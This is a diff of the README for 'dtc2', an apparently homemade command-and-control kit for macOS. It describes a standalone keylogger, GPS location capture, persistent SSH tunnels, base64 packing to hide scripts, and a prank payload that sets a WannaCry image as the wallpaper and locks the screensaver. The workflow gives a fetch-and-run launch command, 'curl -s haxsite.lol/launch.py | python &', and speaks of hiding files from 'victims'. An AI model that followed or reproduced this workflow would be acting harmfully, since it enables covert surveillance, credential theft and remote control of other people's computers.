@@ -1,11 +1,15 @@
 # dtc2
 Duct Tape Command and Control!
 
-WARNING: You will ABSOLUTELY NEED to go into these files and edit them: dtc2.sh, launch.sh, tunnel.sh, upload.php, hax.plist. There are placeholders for where you need to put the domain or ip or host you intend to host some of these things on, and some small tweaks, but nothing that won't take you ~3 minutes. It's worth considering creating a 'generator' shellscript to spit out the 'finished' versions of these files so that you don't have to edit a bunch of files every time you wish to use dtc2. That's for later though :)
+# WARNING
+You will ABSOLUTELY NEED to go into these files and edit them: cups.sh, launch.sh, tunnel.sh, upload.php, snapshot.sh. There are placeholders for where you need to put the domain or ip or host you intend to host some of these things on, and some small tweaks, but nothing that won't take you ~3 minutes. It's worth considering creating a 'generator' shellscript to spit out the 'finished' versions of these files so that you don't have to edit a bunch of files every time you wish to use dtc2. That's for later though :)
+------
 
+# DISCLAIMER
+Most of this code has been cobbled together, duct tape and bailing wire style (duct tape c2, get it now?), it is horribly vulnerable, and could use a lot of polish and work.
+------
 
 # A quick file list:
-
 - **Airport.sh**: this is just a shortcut to the airport binary on OSX
 - **geo.m**: you compile this into a binary to get GPS coords from macs
 - **tunnel.plist**: this is a plist that runs tunnel.sh, to make sure an ssh tunnel stays alive (not required, but there in case you need it)
@@ -24,14 +28,23 @@ WARNING: You will ABSOLUTELY NEED to go into these files and edit them: dtc2.sh,
 - **printdebug**: The ruby keylogger, torn out of powershell empire so it is standalone. It writes to /tmp/debug.db.
 - **printproxy**: the "proxy2" python proxy, for python 2.7, slightly modified so that it listens on more than localhost
 - **packer.py**: a thin layer of obfuscation - encodes shellscripts into base64, and runs them through python to hide cleartext. Probably a good idea to run on cups.sh, launch.sh and snapshot.sh once you're done editing them. Remember to chmod things correctly and change the file extention in launch.sh if you use this. It'll create .py files. Just make sure everything lines up.
-
-# DISCLAIMER
-Most of this code has been cobbled together, duct tape and bailing wire style (duct tape c2, get it now?), it is horribly vulnerable, and could use a lot of polish and work.
+------
 
 # WORKFLOW:
   buy hosting/vm -> setup webserver/letsencrypt/basicauth/etc -> upload files -> create all your payloads -> stand up your listeners -> edit launch.sh and cups.sh -> pack .sh files -> upload -> launch using **curl -s haxsite.lol/launch.py | python &**
 
 You may also want to drop the gallery files into place somewhere so you can upload them. It is **STRONGLY ADVISABLE** to use letsencrypt and apache/nginx basic auth so that your victims can't just stumble across your files, and that you aren't transmitting things in the clear.
+------
+
+# PIRATE
+In this directory are some files:
+- **WebViewScreenSaver.saver**: a screensaver file, borrowed from https://github.com/liquidx/webviewscreensaver - modified so that the default url to open is **file:///tmp/pirate/index.html**
+- ** css, js, scss, index.html**: an HTML5, animated version of the archer pirate virus, with no sound
+- **wannacry.jpg**: a screenshot of the wannacry ransomware application window
+- **launch.sh**: the script that does the thing.
+
+Launch.sh, when run, will drop the piratevirus files and the jpg into /tmp, it will drop the .saver file into ~/Library/Screen Savers/, then it will set the screensaver options in osx to require a password, and set the wait time for the password to 0. It'll then use osascripting to set the wannacry jpg to the desktop on all available desktops, and then select the webviewscreensaver as the main screensaver, and launch it.
+------
 
 As an exercise left to the reader, at this point you can elect to install the plist for an ssh tunnel if you wish, or modify cups.sh to conduct any sort of post-exploit ops you wish. 
 
